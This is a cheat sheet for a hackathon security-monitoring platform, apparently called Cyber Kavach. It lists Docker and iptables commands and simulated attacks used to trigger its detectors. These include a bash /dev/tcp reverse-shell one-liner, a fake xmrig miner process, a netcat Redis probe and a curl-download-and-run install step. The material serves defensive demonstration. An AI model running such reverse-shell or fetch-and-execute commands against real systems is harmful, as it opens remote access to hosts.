# Cyber Kavach: Cheat Sheet & Commands Guide

This document contains all the commands you will need to demo, test, and manage the Cyber Kavach platform.

## 🐳 Docker & Container Management

**Build and Start the Entire Platform**  
*(Run this if you changed any code in the backend or agent to rebuild them)*  
```bash
docker compose up --build -d
```

**Stop the Platform**  
*(Shuts down the backend, frontend, agent, and database without losing logs)*  
```bash
docker compose down
```

**Restart Just the Agent**  
*(Quickly restarts the agent to reset stats or apply simple changes)*  
```bash
docker compose restart agent
```

**View Agent Logs (Live output)**  
*(Watch real-time threat detection from the agent)*  
```bash
docker logs -f cyber-kavach-agent
```

**View Backend Logs**  
*(Helpful if the API or WebSockets aren't responding)*  
```bash
docker logs -f cyber-kavach-backend
```

---

## 🛡️ Firewall & IP Blocking (iptables)

The Cyber Kavach agent uses `iptables` to block malicious IP addresses. 

**View all blocked IPs**  
*(Lists all firewall rules. Look for the `DROP` targets under the `INPUT` chain)*  
```bash
sudo iptables -L INPUT -n --line-numbers
```

**Unblock a specific IP address**  
*(If you accidentally blocked your own IP or want to repeat a test)*  
```bash
sudo iptables -D INPUT -s <IP_ADDRESS> -j DROP

# Example (Unblocking localhost):
sudo iptables -D INPUT -s 127.0.0.1 -j DROP
```

---

## 🕵️‍♂️ Threat Simulation (How to Trigger the Detectors)

Use these commands on your host machine to safely trick the agent into firing alerts during your hackathon demo.

### 1. Reverse Shell Detector
**Command to Run:**  
```bash
bash -i >& /dev/tcp/10.60.209.244/4444 0>&1
```
**What happens:** The agent will instantly detect bash establishing an unauthorized outbound socket, log a `Possible reverse shell` alert, and send a `SIGKILL` to forcefully terminate your bash process.

### 2. Cryptominer Auto-Kill
**Command to Run:**  
```bash
cp /usr/bin/yes /tmp/xmrig && /tmp/xmrig > /dev/null &
```
**What happens:** This creates a background process disguised as `xmrig` that uses 100% CPU. Wait 20 seconds. The agent will log `CRYPTOMINER DETECTED` and kill the rogue process automatically.

### 3. Honeypot Deception Module
**Command to Run:**  
```bash
echo "INFO" | nc -w 1 localhost 6379
```
**What happens:** Simulates an attacker probing an exposed Redis port. The agent catches the payload, drops the connection, and permanently issues an `iptables DROP` ban against the scanner's IP.

### 4. Privilege Escalation (System Tampering)
**Command to Run:**  
```bash
sudo touch /etc/passwd
```
**What happens:** Simulates a rogue admin or script attempting to inject a backdoor account. The agent detects the file modification timestamp (`mtime`) change and broadcasts a `CRITICAL: IDENTITY TAMPERING ALERT`.

### 5. Network Anomaly (IP Blacklist / Threat Intel)
**Command to Run:**  
```bash
curl --max-time 2 http://198.51.100.23
```
**What happens:** Attempts to connect to a known malicious botnet IP located in the `agent/blacklist.txt` file. The agent intercepts the outbound packet and instantly bans the IP.



INstallation script

curl -sLO "https://raw.githubusercontent.com/keerthi-180205/cyber-kavach/main/install.sh" && zsh install.sh

